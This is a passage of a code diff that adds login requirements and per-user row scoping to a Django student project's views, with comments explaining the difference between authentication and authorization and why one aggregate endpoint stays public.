@@ -30,6 +30,23 @@ Part B -- this assignment:
                                               JsonResponse, to show the MIME difference
 
 ItemDetailView also gained a post() so one item's state and draft reply can be changed.
+
+Assignment 5 -- authentication AND authorization. Nothing in this file was rewritten or
+removed; what changed is who may call it, and whose rows they get back.
+
+    AUTHENTICATION  every view below that returns something a person wrote carries
+                    @login_required (function-based) or LoginRequiredMixin (class-based).
+                    The login/signup/logout views live in unopsis/auth_views.py. Exactly one
+                    endpoint stays open to everybody: api_items_by_lane.
+
+    AUTHORIZATION   every queryset that reads a row somebody wrote goes through one of the
+                    owned_*(user) helpers, so a signed-in account reads and writes its OWN
+                    briefs and nothing else.
+
+The two are separate answers to separate questions -- "is anybody there" and "is this yours"
+-- and the second one is the one that is easy to skip, because skipping it has no symptom:
+the site looks locked and every test about the lock passes. The two blocks under the imports
+explain each half, and why LoginRequiredMixin has to be first in the base list.
 """
 
 import csv
@@ -50,6 +67,8 @@ import requests
 import vl_convert
 
 from django.contrib import messages as flash
+from django.contrib.auth.decorators import login_required
+from django.contrib.auth.mixins import LoginRequiredMixin
 from django.db.models import Avg, Case, Count, IntegerField, Q, TextField, Value, When
 from django.db.models.functions import Cast, TruncDate, TruncHour
 from django.http import Http404, HttpResponse, JsonResponse
@@ -61,6 +80,46 @@ from django.views.generic import DetailView, ListView
 
 from .forms import BriefItemCreateForm, ItemSearchForm, ItemUpdateForm, PrivateLookupForm
 from .models import Brief, BriefItem, Connection, Message, Person, Provider, Space
+
+# ======================================================================================
+# ASSIGNMENT 5, PART 1 -- who may read what
+# ======================================================================================
+# Three lines of defence, and it is worth being explicit about which one does what, because
+# the half-done version of this looks identical in review:
+#
+#   @login_required          on every function-based view below that reads real data
+#   LoginRequiredMixin       on every class-based view, written FIRST in the base list
+#   {% if user.is_authenticated %}  in templates/base.html and home.html, so the links and
+#                            the figures are hidden too -- hiding a link is not security, but
+#                            showing a logged-out stranger a headline is a leak even if the
+#                            page behind the link would have turned them away.
+#
+# LoginRequiredMixin must come before the generic view in the bases
+# (BriefDetailView(LoginRequiredMixin, DetailView), never the other way round). Python
+# resolves dispatch() left to right, so a mixin listed second never runs: the class looks
+# protected, reviews as protected, and serves the page to anybody. There is no error.
+#
+# Putting it on the CLASS rather than on get() is the other half of that. BriefDetailView and
+# ItemDetailView both define post(), and those two POSTs -- create an item, rewrite an item's
+# state and its draft reply -- were the only unauthenticated WRITES this project had. A
+# decorator on get() alone would have left both of them open while making the pages look shut.
+#
+# EXACTLY ONE endpoint is deliberately left public, api_items_by_lane (see its docstring),
+# plus home() and the three /accounts/ pages. Everything else that touches the database
+# requires a session. The rule of thumb used to decide: if a response contains anything a
+# person wrote -- a title, a summary, a message body, a display name, a handle -- it is
+# private. Aggregate counts over those rows are not, and the public feed is counts only.
+#
+# A session is where this stops, though, and it is not where protection stops: see the second
+# block, "who may read WHOSE rows", immediately below. Those three lines of defence all answer
+# "is anybody there". None of them answers "is this yours".
+#
+# What an anonymous request to a protected JSON endpoint actually gets is a 302 to
+# /accounts/login/?next=..., not a 401. That is Django's standard behaviour and it is what
+# LOGIN_URL is for, but it means `curl` follows the redirect and prints an HTML login page
+# with status 200, which reads at a glance like the endpoint is still open. It is not: the
+# tests assert the 302 itself (follow=False), which is the honest check.
+
 
 LIST_TEMPLATE = "unopsis/briefitem_list.html"
 
@@ -74,6 +133,87 @@ LANE_PRIORITY = Case(
 )
 
 
+# ======================================================================================
+# ASSIGNMENT 5, PART 1 (second half) -- who may read WHOSE rows
+# ======================================================================================
+# @login_required answers "is anybody there". It does not answer "is this yours", and those
+# are different questions with the same-looking symptom when only the first one is asked: the
+# site looks locked, every test about the lock passes, and every signed-in account still reads
+# every other account's briefs, item titles, summaries, draft replies, contacts and message
+# bodies. The sign-up page is public -- it has to be, the assignment asks for it -- so an
+# authentication-only boundary stops a stranger for exactly one HTTP request: the one where
+# they create an account.
+#
+# Space.user is the column that was always meant to carry this. Space's own docstring says it
+# exists "to keep a user's work Slack from ever leaking into their personal brief"; until the
+# helpers below existed, nothing honoured it. Every model in this project reaches a User
+# through Space, so there is exactly one join to get right per model:
+#
+#     Space       .user
+#     Connection  .space.user          Person   .space.user       Brief  .space.user
+#     Message     .connection.space.user                          BriefItem .brief.space.user
+#
+# Those joins are written ONCE, here, rather than spelled out at each of the twenty-odd call
+# sites. A missing .filter() does not raise, does not fail a test that only checks status
+# codes, and does not look wrong in review -- so the defence has to be a function somebody
+# would have to deliberately not call, not a line somebody could forget to type.
+#
+# AnonymousUser is handled by returning an EMPTY queryset rather than by raising. Only one
+# view below is reachable logged out and also reads rows (home(), the front door), and an
+# empty queryset lets that view keep a single code path: it still runs its query, the query
+# still returns nothing, and the template's {% if user.is_authenticated %} is then a second
+# independent reason the data is not on the page rather than the only one.
+#
+# NOT scoped, deliberately: items_by_lane_rows() and the public endpoint built on it. It
+# answers site-wide counts with no row-level detail at all, which is precisely why it is the
+# one feed that may be published. Its docstring says so at length.
+def _no_one(model):
+    """An empty queryset of `model`: what an anonymous request owns."""
+    return model.objects.none()
+
+
+def owned_spaces(user):
+    """The Spaces `user` owns."""
+    if not user.is_authenticated:
+        return _no_one(Space)
+    return Space.objects.filter(user=user)
+
+
+def owned_briefs(user):
+    """The Briefs `user` owns, through the Space they were generated for."""
+    if not user.is_authenticated:
+        return _no_one(Brief)
+    return Brief.objects.filter(space__user=user)
+
+
+def owned_items(user):
+    """The BriefItems `user` owns: BriefItem -> Brief -> Space -> User, three hops."""
+    if not user.is_authenticated:
+        return _no_one(BriefItem)
+    return BriefItem.objects.filter(brief__space__user=user)
+
+
+def owned_messages(user):
+    """The raw Messages `user` owns, through the Connection they arrived on."""
+    if not user.is_authenticated:
+        return _no_one(Message)
+    return Message.objects.filter(connection__space__user=user)
+
+
+def owned_people(user):
+    """The People `user` owns. A display name and a handle are personal data twice over."""
+    if not user.is_authenticated:
+        return _no_one(Person)
+    return Person.objects.filter(space__user=user)
+
+
+def owned_connections(user):
+    """The Connections `user` owns -- which mailbox and which chat account are linked."""
+    if not user.is_authenticated:
+        return _no_one(Connection)
+    return Connection.objects.filter(space__user=user)
+
+
 def filtered_items(request):
     """
     The one query every list view shares.
@@ -83,7 +223,8 @@ def filtered_items(request):
     A filter that matches nothing is how we reach the empty state on the page.
     """
     items = (
-        BriefItem.objects.select_related("brief__space")
+        owned_items(request.user)
+        .select_related("brief__space")
         .annotate(lane_priority=LANE_PRIORITY)
         .order_by("-brief__space__kind", "lane_priority", "rank")
     )
@@ -117,6 +258,7 @@ def list_context(request, view_label):
 # --------------------------------------------------------------------------------------
 # 1. Function-based view, manual: load the template yourself, render it, wrap in HttpResponse
 # --------------------------------------------------------------------------------------
+@login_required
 def item_list_manual(request):
     """
     Shows every stage of what Django normally hides:
@@ -133,6 +275,7 @@ def item_list_manual(request):
 # --------------------------------------------------------------------------------------
 # 2. Function-based view, shortcut: render() does the three steps above in one call
 # --------------------------------------------------------------------------------------
+@login_required
 def item_list_render(request):
     """Same page as view 1 with render(request, template, context): load + fill + wrap."""
     context = list_context(request, "Function-based view: render() shortcut")
@@ -142,7 +285,7 @@ def item_list_render(request):
 # --------------------------------------------------------------------------------------
 # 3. Class-based view, base: inherit from View and write get() yourself
 # --------------------------------------------------------------------------------------
-class ItemListBaseView(View):
+class ItemListBaseView(LoginRequiredMixin, View):
     """
     The base View knows nothing about our model, so we query it ourselves inside get().
     (`model = BriefItem` would do nothing here. That is what the generic view adds.)
@@ -156,7 +299,7 @@ class ItemListBaseView(View):
 # --------------------------------------------------------------------------------------
 # 4. Class-based view, generic: ListView / DetailView do the querying and template lookup
 # --------------------------------------------------------------------------------------
-class ItemListView(ListView):
+class ItemListView(LoginRequiredMixin, ListView):
     """
     model = BriefItem is enough for ListView to fetch rows and to find its template by
     convention: <app>/<model>_list.html  ->  unopsis/briefitem_list.html.
@@ -177,7 +320,7 @@ class ItemListView(ListView):
         return context
 
 
-class ItemDetailView(DetailView):
+class ItemDetailView(LoginRequiredMixin, DetailView):
     """
     One card in full, including its "receipts" (the messages it was built from).
     Default template by convention: unopsis/briefitem_detail.html, with the object as `item`.
@@ -187,7 +330,11 @@ class ItemDetailView(DetailView):
     context_object_name = "item"
 
     def get_queryset(self):
-        return BriefItem.objects.select_related(
+        # owned_items() rather than BriefItem.objects: this queryset is what get_object() reads,
+        # so scoping it here is what makes ANOTHER user's pk a 404 on the GET *and* on the
+        # post() below, which resolves its target through the same call. Had only the GET been
+        # scoped, the page would have 404'd while the write still landed -- silently.
+        return owned_items(self.request.user).select_related(
             "brief__space", "primary_message"
         ).prefetch_related("messages__author", "messages__connection")
 
@@ -235,6 +382,18 @@ def home(request):
     The home page, wired to "" in unopsis/urls.py so the root address is a real page instead
     of Django's "page not found" list.
 
+    Assignment 5: this is the ONE page that keeps real data in its context while staying
+    reachable logged out, and it is deliberate. It is the front door -- the page that carries
+    the Log in and Sign up buttons -- so putting @login_required on it would bounce a
+    first-time visitor from / straight to /accounts/login/?next=/ and make the deployed site
+    look broken before anyone had a chance to read what it is.
+
+    The gate therefore lives in the template instead of on the view: unopsis/home.html wraps
+    the briefs, the Needs-you titles and the row counts in {% if user.is_authenticated %} and
+    shows a sign-in invitation in their place. The query below still runs for an anonymous
+    visitor, which costs six counts and two small selects against SQLite and keeps this view
+    a single, readable code path; what changes is that none of it reaches the page.
+
     It is also the shortest end-to-end demonstration of the flow the assignment asks for:
 
         models.py    Brief / BriefItem / Message define the data and get_absolute_url()
@@ -243,8 +402,10 @@ def home(request):
         templates/   unopsis/home.html renders the context and links onward with {% url %}
                      and {{ item.get_absolute_url }}
     """
+    user = request.user
     briefs = (
-        Brief.objects.select_related("space", "space__user")
+        owned_briefs(user)
+        .select_related("space", "space__user")
         .annotate(item_count=Count("items", distinct=True))
         .order_by("-window_end")
     )
@@ -252,26 +413,33 @@ def home(request):
         "briefs": briefs[:4],
         # Needs-you items only, best rank first: the three things the product exists to say.
         "urgent_items": (
-            BriefItem.objects.filter(lane=BriefItem.Lane.NEEDS_YOU)
+            owned_items(user)
+            .filter(lane=BriefItem.Lane.NEEDS_YOU)
             .exclude(state=BriefItem.State.DISMISSED)
             .select_related("brief__space")
             .order_by("rank")[:3]
         ),
         # A LIST of (label, number) pairs rather than a dict: in a template, {{ totals.items }}
         # would look up the dict KEY "items" before it ever reached dict.items().
+        #
+        # These are the signed-in user's own row counts, not the site's. A visitor reading
+        # "Messages 412" on a page that only ever shows them their own four is being told
+        # something about other people's mailboxes, which is small but is still a fact about
+        # somebody else -- and for an anonymous visitor every one of them is 0, because
+        # owned_*() returns nothing. The template hides the whole block logged out anyway.
         "totals": [
-            ("Spaces", Space.objects.count()),
-            ("Connections", Connection.objects.count()),
-            ("People", Person.objects.count()),
-            ("Messages", Message.objects.count()),
-            ("Briefs", Brief.objects.count()),
-            ("Brief items", BriefItem.objects.count()),
+            ("Spaces", owned_spaces(user).count()),
+            ("Connections", owned_connections(user).count()),
+            ("People", owned_people(user).count()),
+            ("Messages", owned_messages(user).count()),
+            ("Briefs", owned_briefs(user).count()),
+            ("Brief items", owned_items(user).count()),
         ],
     }
     return render(request, "unopsis/home.html", context)
 
 
-class BriefListView(ListView):
+class BriefListView(LoginRequiredMixin, ListView):
     """
     Every brief, newest first, with the number of items on it computed in the database rather
     than by calling .items.count() once per row in the template.
@@ -283,7 +451,8 @@ class BriefListView(ListView):
 
     def get_queryset(self):
         return (
-            Brief.objects.select_related("space", "space__user")
+            owned_briefs(self.request.user)
+            .select_related("space", "space__user")
             .annotate(
                 item_count=Count("items", distinct=True),
                 needs_you_count=Count(
@@ -294,7 +463,7 @@ class BriefListView(ListView):
         )
 
 
-class BriefDetailView(DetailView):
+class BriefDetailView(LoginRequiredMixin, DetailView):
     """
     One brief by primary key: /briefs/<int:pk>/.
 
@@ -311,7 +480,14 @@ class BriefDetailView(DetailView):
     template_name = "unopsis/brief_detail.html"
 
     def get_queryset(self):
-        return Brief.objects.select_related("space", "space__user").prefetch_related("items")
+        # Scoped for the same reason ItemDetailView's is: post() below creates a row on
+        # self.get_object(), so this one queryset decides both who may read this brief and who
+        # may write to it. Another user's pk is a 404 here, not a quiet insert into their brief.
+        return (
+            owned_briefs(self.request.user)
+            .select_related("space", "space__user")
+            .prefetch_related("items")
+        )
 
     def get_context_data(self, **kwargs):
         context = super().get_context_data(**kwargs)
@@ -338,9 +514,14 @@ class BriefDetailView(DetailView):
 # ======================================================================================
 # PART B -- SECTION 2 + 5: ORM queries, the GET form, the POST form, and aggregations
 # ======================================================================================
-def search_items(cleaned):
+def search_items(cleaned, user):
     """
     Turn the cleaned GET form into one queryset, one Django field lookup at a time.
+
+    `user` is not one of the search terms: it is the set this search runs INSIDE. Taking it as
+    an argument rather than reading it off a request is what makes it impossible to call this
+    helper without saying whose rows it may touch -- a search that silently spanned every
+    account would look identical from the outside and return other people's item titles.
 
     Lookups used here, which is the list the assignment asks to see:
 
@@ -356,7 +537,8 @@ def search_items(cleaned):
     of the conditions; nothing is evaluated until the template iterates it.
     """
     items = (
-        BriefItem.objects.select_related("brief__space")
+        owned_items(user)
+        .select_related("brief__space")
         .annotate(lane_priority=LANE_PRIORITY)
         .order_by("-brief__space__kind", "lane_priority", "rank")
     )
@@ -403,27 +585,31 @@ def label_rows(rows, key, labels):
     return rows
 
 
-def aggregate_summaries():
+def aggregate_summaries(user):
     """
-    The aggregation half of Section 2.
+    The aggregation half of Section 2, over the rows `user` owns.
 
     * a TOTAL with .count() / .aggregate(), which collapses a queryset to one number, and
     * GROUPED summaries with .values(...).annotate(Count(...)), which is Django's GROUP BY:
       values() names the grouping columns, annotate() is the aggregate per group.
     """
+    items = owned_items(user)
+    briefs = owned_briefs(user)
+    msgs = owned_messages(user)
+    people = owned_people(user)
     return {
         # --- totals ---
-        "total_items": BriefItem.objects.count(),
-        "total_messages": Message.objects.count(),
-        "total_noise": Message.objects.filter(is_noise=True).count(),
-        "total_briefs": Brief.objects.count(),
+        "total_items": items.count(),
+        "total_messages": msgs.count(),
+        "total_noise": msgs.filter(is_noise=True).count(),
+        "total_briefs": briefs.count(),
         "avg_items_per_brief": (
-            Brief.objects.annotate(n=Count("items")).aggregate(avg=Avg("n"))["avg"] or 0
+            briefs.annotate(n=Count("items")).aggregate(avg=Avg("n"))["avg"] or 0
         ),
         # --- grouped: items per lane (GROUP BY lane) ---
         "by_lane": label_rows(
             list(
-                BriefItem.objects.values("lane")
+                items.values("lane")
                 .annotate(total=Count("id"))
                 .order_by("-total")
             ),
@@ -432,7 +618,7 @@ def aggregate_summaries():
         # --- grouped: items per space kind, spanning two relationships ---
         "by_space": label_rows(
             list(
-                BriefItem.objects.values("brief__space__kind")
+                items.values("brief__space__kind")
                 .annotate(total=Count("id"))
                 .order_by("-total")
             ),
@@ -441,7 +627,7 @@ def aggregate_summaries():
         # --- grouped: messages per provider, spanning Message -> Connection ---
         "by_provider": label_rows(
             list(
-                Message.objects.values("connection__provider")
+                msgs.values("connection__provider")
                 .annotate(total=Count("id"))
                 .order_by("-total")
             ),
@@ -450,7 +636,7 @@ def aggregate_summaries():
         # --- grouped: who sends the most, and how much of it is cited in a brief ---
         "by_person": label_rows(
             list(
-                Person.objects.values("display_name", "space__kind")
+                people.values("display_name", "space__kind")
                 .annotate(
                     sent=Count("messages", distinct=True),
                     cited=Count("messages__brief_items", distinct=True),
@@ -462,7 +648,7 @@ def aggregate_summaries():
         ),
         # --- grouped: each brief with its item count and its receipt count ---
         "by_brief": list(
-            Brief.objects.select_related("space")
+            briefs.select_related("space")
             .annotate(
                 item_count=Count("items", distinct=True),
                 receipt_count=Count("items__messages", distinct=True),
@@ -472,7 +658,7 @@ def aggregate_summaries():
     }
 
 
-class InsightsView(ListView):
+class InsightsView(LoginRequiredMixin, ListView):
     """
     The page that carries Sections 2 and 5 at once: a list, a GET search, a POST lookup and
     the aggregation summaries.
@@ -495,9 +681,10 @@ class InsightsView(ListView):
         writes, so there is no harm in the browser re-issuing it.
         """
         self.search_form = ItemSearchForm(self.request.GET or None)
+        user = self.request.user
         if self.request.GET and self.search_form.is_valid():
-            return search_items(self.search_form.cleaned_data)
-        return search_items({})
+            return search_items(self.search_form.cleaned_data, user)
+        return search_items({}, user)
 
     def get_context_data(self, **kwargs):
         context = super().get_context_data(**kwargs)
@@ -505,7 +692,7 @@ class InsightsView(ListView):
         context.setdefault("lookup_form", PrivateLookupForm())
         context.setdefault("lookup_results", None)
         context.setdefault("lookup_ran", False)
-        context["summaries"] = aggregate_summaries()
+        context["summaries"] = aggregate_summaries(self.request.user)
         context["lane_labels"] = LANE_LABELS
         context["state_labels"] = STATE_LABELS
         context["space_labels"] = SPACE_LABELS
@@ -537,8 +724,17 @@ class InsightsView(ListView):
             handle = form.cleaned_data["handle"].strip()
             # Person.handles is a JSONField (a list). Cast it to text so a plain icontains
             # works on SQLite as well as on Postgres.
+            # Scoped first, searched second. This form takes a mobile number or a personal
+            # address and answers with a name, every item that cites them and ten of their
+            # message bodies, so an unscoped version is not "a search that returns too much":
+            # it is a directory lookup over every account on the site, driven by a string the
+            # searcher already has. Narrowing the Person queryset is enough to narrow all
+            # three results, because the items and the messages are both filtered by
+            # author__in=people.
+            user = request.user
             people = (
-                Person.objects.annotate(handles_text=Cast("handles", TextField()))
+                owned_people(user)
+                .annotate(handles_text=Cast("handles", TextField()))
                 .filter(Q(handles_text__icontains=handle)
                         | Q(display_name__icontains=handle))
                 .select_related("space")
@@ -549,13 +745,15 @@ class InsightsView(ListView):
                 "people": list(people),
                 # Items whose receipts cite a message written by one of those people.
                 "items": list(
-                    BriefItem.objects.filter(messages__author__in=people)
+                    owned_items(user)
+                    .filter(messages__author__in=people)
                     .select_related("brief__space")
                     .distinct()
                     .order_by("lane", "rank")
                 ),
                 "messages": list(
-                    Message.objects.filter(author__in=people)
+                    owned_messages(user)
+                    .filter(author__in=people)
                     .select_related("author", "connection")
                     .order_by("-sent_at")[:10]
                 ),
@@ -596,6 +794,7 @@ def _png_response(figure):
     return response
 
 
+@login_required
 def lane_chart_png(request):
     """
     Bar chart: how many brief items sit in each lane, split by work and personal space.
@@ -604,7 +803,8 @@ def lane_chart_png(request):
     exactly like illinois.edu/sections/enrollment.png in the brief.
     """
     rows = (
-        BriefItem.objects.values("lane", "brief__space__kind")
+        owned_items(request.user)
+        .values("lane", "brief__space__kind")
         .annotate(total=Count("id"))
         .order_by("lane")
     )
@@ -640,10 +840,12 @@ def lane_chart_png(request):
     return _png_response(figure)
 
 
+@login_required
 def provider_chart_png(request):
     """Pie chart: where the raw messages actually came from (Message -> Connection -> provider)."""
     rows = (
-        Message.objects.values("connection__provider")
+        owned_messages(request.user)
+        .values("connection__provider")
         .annotate(total=Count("id"))
         .order_by("-total")
     )
@@ -701,9 +903,9 @@ def serialize_item(item):
     }
 
 
-def api_item_queryset(params):
+def api_item_queryset(params, user):
     """
-    The API's filtering, driven entirely by query parameters:
+    The API's filtering, driven entirely by query parameters, over the rows `user` owns.
 
         /api/items/?lane=needs_you
         /api/items/?space=personal&state=open
@@ -713,7 +915,8 @@ def api_item_queryset(params):
     endpoint breaking.
     """
     items = (
-        BriefItem.objects.select_related("brief__space")
+        owned_items(user)
+        .select_related("brief__space")
         .annotate(receipt_count=Count("messages"))
         .annotate(lane_priority=LANE_PRIORITY)
         .order_by("lane_priority", "rank")
@@ -725,6 +928,9 @@ def api_item_queryset(params):
     if params.get("space"):
         items = items.filter(brief__space__kind__exact=params["space"])
     if params.get("brief"):
+        # A pk straight off the query string, and safe precisely because it is applied to the
+        # already-scoped queryset above: ?brief=<somebody else's id> intersects to nothing and
+        # returns {"count": 0}, rather than being an id-guessing read of their brief.
         items = items.filter(brief_id=params["brief"])
     if params.get("q"):
         items = items.filter(
@@ -735,6 +941,7 @@ def api_item_queryset(params):
     return items
 
 
+@login_required
 def api_items(request):
     """
     FUNCTION-BASED JSON API.
@@ -744,7 +951,7 @@ def api_items(request):
     A list is wrapped in an object ({"count": .., "results": [..]}) rather than returned bare,
     which leaves room to add paging later without breaking existing clients.
     """
-    items = api_item_queryset(request.GET)
+    items = api_item_queryset(request.GET, request.user)
     try:
         limit = min(int(request.GET.get("limit", 50)), 200)
     except ValueError:
@@ -760,7 +967,7 @@ def api_items(request):
     return JsonResponse(payload, json_dumps_params={"indent": 2})
 
 
-class ItemsApiView(View):
+class ItemsApiView(LoginRequiredMixin, View):
     """
     CLASS-BASED version of the same endpoint, so the project shows both styles.
 
@@ -769,7 +976,7 @@ class ItemsApiView(View):
     """
 
     def get(self, request, *args, **kwargs):
-        items = api_item_queryset(request.GET)
+        items = api_item_queryset(request.GET, request.user)
         return JsonResponse(
             {
                 "count": items.count(),
@@ -780,12 +987,13 @@ class ItemsApiView(View):
         )
 
 
+@login_required
 def api_insights(request):
     """
     The aggregations as JSON: the same numbers the charts are drawn from, so a client can plot
     them itself. Optional ?space=work narrows every figure to one space.
     """
-    items = BriefItem.objects.all()
+    items = owned_items(request.user)
     space = request.GET.get("space")
     if space:
         if space not in SPACE_LABELS:
@@ -796,8 +1004,9 @@ def api_insights(request):
         items = items.filter(brief__space__kind__exact=space)
 
     by_lane = items.values("lane").annotate(total=Count("id")).order_by("-total")
+    user_messages = owned_messages(request.user)
     by_provider = (
-        Message.objects.values("connection__provider")
+        user_messages.values("connection__provider")
         .annotate(total=Count("id"))
         .order_by("-total")
     )
@@ -806,7 +1015,7 @@ def api_insights(request):
     # day land in the same GROUP BY bucket regardless of time-of-day. Unfiltered by ?space=,
     # same as messages_by_provider above -- Message has no direct space column to filter on.
     by_day = (
-        Message.objects.annotate(day=TruncDate("sent_at"))
+        user_messages.annotate(day=TruncDate("sent_at"))
         .values("day")
         .annotate(total=Count("id"))
         .order_by("day")
@@ -816,9 +1025,9 @@ def api_insights(request):
             "space": space or "all",
             "totals": {
                 "items": items.count(),
-                "messages": Message.objects.count(),
-                "briefs": Brief.objects.count(),
-                "people": Person.objects.count(),
+                "messages": user_messages.count(),
+                "briefs": owned_briefs(request.user).count(),
+                "people": owned_people(request.user).count(),
             },
             "items_by_lane": [
                 {"lane": row["lane"], "label": LANE_LABELS.get(row["lane"], row["lane"]),
@@ -843,6 +1052,7 @@ def api_insights(request):
     )
 
 
+@login_required
 def api_items_text(request):
     """
     The SAME data as /api/items/, returned with HttpResponse instead of JsonResponse, so the
@@ -865,21 +1075,28 @@ def api_items_text(request):
 
     Check it with:  curl -sI http://127.0.0.1:8000/api/items/ | grep -i content-type
     """
-    items = api_item_queryset(request.GET)[:50]
+    items = api_item_queryset(request.GET, request.user)[:50]
     body = json.dumps(
         {"count": len(items), "results": [serialize_item(i) for i in items]}, indent=2
     )
     return HttpResponse(body, content_type="text/plain; charset=utf-8")
 
 
+@login_required
 def api_items_csv(request):
     """The same rows again as CSV, the third MIME type. See api_items_text for the comparison."""
-    items = api_item_queryset(request.GET)[:200]
+    items = api_item_queryset(request.GET, request.user)[:200]
     buffer = io.StringIO()
     writer = csv.writer(buffer)
     writer.writerow(["id", "title", "lane", "rank", "state", "space", "url"])
     for item in items:
-        writer.writerow([item.pk, item.title, item.lane, item.rank, item.state,
+        # csv_safe() on the one free-text cell, for exactly the reason its docstring gives.
+        # This endpoint and /export/brief-items.csv both answer text/csv with an attachment
+        # disposition, so both produce a file that Excel and Sheets open and both evaluate a
+        # leading =, +, -, @, tab or CR as a formula. The export was defended and this one was
+        # not, which is the way a defence usually fails: not removed, just not copied to the
+        # sibling that grew up next to it. CsvInjectionTests now asserts both.
+        writer.writerow([item.pk, csv_safe(item.title), item.lane, item.rank, item.state,
                          item.brief.space.kind, item.get_absolute_url()])
     response = HttpResponse(buffer.getvalue(), content_type="text/csv")
     response["Content-Disposition"] = 'attachment; filename="unopsis-items.csv"'
@@ -922,9 +1139,15 @@ def items_by_lane_rows():
     ]
 
 
-def messages_by_hour_rows():
+def messages_by_hour_rows(user):
     """
-    Chart 2's data: one {hour, total} record per hour from the first message to the last.
+    Chart 2's data: one {hour, total} record per hour from the first message to the last,
+    over the messages `user` owns.
+
+    Scoped, unlike items_by_lane_rows() above it, and the difference is the whole of the
+    "which feed may be published" decision. This one is an hour-by-hour record of when one
+    person's messages arrive, which is also a record of when they sleep, when they work and
+    when they were away. Counts about a person are still about a person.
 
     TruncHour is the GROUP BY bucket. Hours with no messages are filled in as zero here,
     because a line drawn only through the busy hours would join them with a straight segment
@@ -932,7 +1155,8 @@ def messages_by_hour_rows():
     """
     counts = {
         row["hour"]: row["total"]
-        for row in Message.objects.annotate(hour=TruncHour("sent_at"))
+        for row in owned_messages(user)
+        .annotate(hour=TruncHour("sent_at"))
         .values("hour")
         .annotate(total=Count("id"))
     }
@@ -947,28 +1171,67 @@ def messages_by_hour_rows():
 
 
 def api_items_by_lane(request):
-    """GET /api/insights/items-by-lane/ -- chart 1's feed, a bare array (hence safe=False)."""
+    """
+    GET /api/insights/items-by-lane/ -- chart 1's feed, a bare array (hence safe=False).
+
+    THE ONE PUBLIC API. Every other endpoint in this file gained @login_required or
+    LoginRequiredMixin in Assignment 5; this one deliberately did not, and the missing
+    decorator is the feature, so please do not "fix" it. Assignment 5 Part 3 asks for exactly
+    one endpoint that a classmate, a Vega-Lite spec or a Python script can read with no
+    account, and this is it.
+
+    It is safe to leave open because of WHAT it answers, not because of who asks. The whole
+    response is three rows of {lane, label, total}: aggregate counts, plus labels that come
+    from BriefItem.Lane.choices in code rather than from the database. No title, no summary,
+    no message body, no person, no handle, no timestamp. A reader learns how many items sit
+    in each lane and nothing whatsoever about any of them.
+
+    Note what was NOT made public alongside it, because both look equally harmless and are
+    not. /api/insights/ carries the same counts plus a day-by-day activity timeline and the
+    list of providers the user has connected; /api/insights/messages-by-hour/ is an
+    hour-by-hour record of when one person's messages arrive, which also says when they sleep.
+    Counts about a person are still about a person. Both are protected.
+
+    unopsis/middleware.py adds Access-Control-Allow-Origin: * here, which is what lets the
+    Vega-Lite editor at vega.github.io read it cross-origin.
+
+    What is built on this URL, so that changing its SHAPE is understood to be a breaking
+    change rather than a refactor: docs/a5/vega_lite_chart.txt (the submitted chart spec,
+    which encodes the field names `label`, `total` and `lane` by name) and the three
+    programs in docs/a5/alternative_uses/. The response is a bare ARRAY on purpose -- wrap
+    it in an object one day and every one of those needs editing, and the Vega-Lite chart
+    in particular would fail by silently rendering empty. PublicApiSubmissionTests in
+    tests.py reads those files and checks them against this view on every run.
+    """
     return JsonResponse(items_by_lane_rows(), safe=False, json_dumps_params={"indent": 2})
 
 
+@login_required
 def api_messages_by_hour(request):
     """GET /api/insights/messages-by-hour/ -- chart 2's feed, a bare array (hence safe=False)."""
-    return JsonResponse(messages_by_hour_rows(), safe=False, json_dumps_params={"indent": 2})
+    return JsonResponse(
+        messages_by_hour_rows(request.user), safe=False, json_dumps_params={"indent": 2}
+    )
 
 
 # One entry per chart. `rows` is the same function its data URL serves, so the server-rendered
 # PNG and the browser-rendered chart can never be drawn from different numbers.
+#
+# Every entry takes the REQUEST, even chart 1 whose rows do not depend on it. A uniform
+# signature is what lets vega_chart_png() call config["rows"](request) without knowing which
+# chart it is holding -- and the day a third chart is added, the only way to write it is the
+# way that gets the scoping right, because there is no zero-argument form to reach for.
 VEGA_CHARTS = {
     "chart1": {
         "spec_file": "chart1_items_by_lane.vl.json",
-        "rows": items_by_lane_rows,
+        "rows": lambda request: items_by_lane_rows(),
         "kind": "Bar chart",
         "title": "Brief items by lane",
         "caption": "One bar per lane, from a GROUP BY lane over BriefItem.",
     },
     "chart2": {
         "spec_file": "chart2_messages_by_hour.vl.json",
-        "rows": messages_by_hour_rows,
+        "rows": lambda request: messages_by_hour_rows(request.user),
         "kind": "Line chart",
         "title": "Messages received per hour",
         "caption": "Message rows bucketed with TruncHour(sent_at), empty hours drawn as zero.",
@@ -990,6 +1253,7 @@ def _load_spec(chart):
     return json.loads(path.read_text(encoding="utf-8"))
 
 
+@login_required
 def vega_chart_spec(request, chart):
     """
     GET /vega-lite/<chart>.json -- the spec, ready to paste into the Vega-Lite editor.
@@ -1003,6 +1267,7 @@ def vega_chart_spec(request, chart):
     return JsonResponse(spec, json_dumps_params={"indent": 2})
 
 
+@login_required
 def vega_chart_page(request, chart):
     """GET /vega-lite/<chart>/ -- one chart, embedded on a page of its own."""
     config = _vega_chart(chart)
@@ -1018,6 +1283,7 @@ def vega_chart_page(request, chart):
     )
 
 
+@login_required
 def vega_chart_png(request, chart):
     """
     GET /vega-lite/<chart>.png -- the Vega-Lite spec rendered to an image on the server.
@@ -1031,7 +1297,7 @@ def vega_chart_png(request, chart):
     """
     config = _vega_chart(chart)
     spec = _load_spec(chart)
-    spec["data"] = {"values": config["rows"]()}
+    spec["data"] = {"values": config["rows"](request)}
     png = vl_convert.vegalite_to_png(spec, scale=2)
     response = HttpResponse(png, content_type="image/png")
     response["Content-Length"] = str(len(png))
@@ -1160,6 +1426,7 @@ def analyse_deadline(deadline_day, today, holidays, long_weekends):
     }
 
 
+@login_required
 def deadline_holidays(request):
     """
     GET /api/deadlines/holidays/?country=US&bridge_days=1
@@ -1191,7 +1458,8 @@ def deadline_holidays(request):
         )
 
     items = list(
-        BriefItem.objects.filter(state=BriefItem.State.OPEN, deadline_at__isnull=False)
+        owned_items(request.user)
+        .filter(state=BriefItem.State.OPEN, deadline_at__isnull=False)
         .select_related("brief__space")
         .order_by("deadline_at")
     )
@@ -1291,9 +1559,14 @@ EXPORT_COLUMNS = [
 ]
 
 
-def export_item_queryset():
+def export_item_queryset(user):
     """
-    The rows both exports contain, in the order both exports write them.
+    The rows both exports contain, in the order both exports write them -- `user`'s rows.
+
+    "A snapshot of the whole table" below means the whole of what the person asking owns, not
+    the whole table. An export is the single highest-volume read in the project (every title,
